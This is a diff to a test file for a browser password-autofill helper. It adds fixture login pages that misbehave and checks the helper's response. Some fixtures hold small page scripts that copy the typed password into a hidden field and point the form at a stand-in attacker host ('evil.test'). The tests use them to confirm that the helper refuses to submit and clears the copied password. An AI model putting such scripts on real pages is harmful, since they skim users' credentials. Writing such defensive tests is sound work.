@@ -50,6 +50,24 @@ PAGES = {
     "/login/tenant": FORM.format("<input name=username id=u><input type=password name=p>")
     + '<script>document.getElementById("u").addEventListener("input",'
     '()=>{document.forms[0].action="https://evil.test/t"})</script>',
+    # the app copies the password on "change" (when the box is left), not on each key
+    "/login/state": FORM.format(
+        "<input name=username><input type=password name=p id=p><input type=hidden name=c id=c>"
+    )
+    + '<script>p.addEventListener("change", () => { c.value = p.value; })</script>',
+    # the password's change handler copies it and moves the form off-trust
+    "/login/late": FORM.format(
+        "<input name=username><input type=password name=p id=p><input type=hidden name=c id=c>"
+    )
+    + '<script>p.addEventListener("change", () => { c.value = p.value;'
+    ' document.forms[0].action = "https://evil.test/late"; })</script>',
+    # the page takes the password on "change" and empties the box: never refilled
+    "/login/consume": FORM.format("<input name=username><input type=password name=p id=p>")
+    + '<script>p.addEventListener("change", () => { p.value = ""; })</script>',
+    # typing the username disables the button (validation): the password is not typed
+    "/login/gate": FORM.format("<input name=username id=u><input type=password name=p>")
+    + '<script>u.addEventListener("input", () => {'
+    ' document.querySelector("button").disabled = true; })</script>',
 }
 EXPECTED = {
     "/login/mfa": "challenge",
@@ -64,6 +82,10 @@ EXPECTED = {
     "/news": "not-sign-in",
     "/login/tenant": "changed",
     "/login/typed": "typing",
+    "/login/state": "password",
+    "/login/late": "password",  # refused, but counted: the page saw the password
+    "/login/consume": "password",  # counted, not refilled or submitted
+    "/login/gate": "stuck",
 }
 
 
@@ -132,6 +154,11 @@ def test_sign_in_script_on_real_forms(browser: Any) -> None:
             for path, expected in EXPECTED.items():
                 page.goto(origin + path)
                 assert sign_in_headless(page, _login(origin), set(), sync_api.Error) == expected
+                if path in ("/login/tenant", "/login/late", "/login/gate"):  # not submitted
+                    assert page.input_value("input[name=p]") == ""  # never typed, or taken back
+                    assert page.locator("[data-codapact-fill]").count() == 0
+                if path == "/login/late":  # the page was told: its copy is gone too
+                    assert page.input_value("#c") == ""
                 page.wait_for_timeout(200)
             # a window without a password leaves the password box to the person
             page.goto(origin + "/login/csrf")
@@ -142,8 +169,10 @@ def test_sign_in_script_on_real_forms(browser: Any) -> None:
     finally:
         site.shutdown()
     bodies = [urllib.parse.parse_qs(body) for _, body in site.posts]
-    # only the CSRF form and the GET form (posted instead) sent the password, both by POST
-    assert [b.get("p") for b in bodies] == [["s3cret pw"], ["s3cret pw"]]
+    # only the CSRF form, the GET form (posted instead) and the change-state form sent the
+    # password, all by POST; the last one's copy shows its "change" event fired
+    assert [b.get("p") for b in bodies] == [["s3cret pw"]] * 3
+    assert bodies[2].get("c") == ["s3cret pw"]
     assert all(path == "/ok" for path, _ in site.posts)
 
 
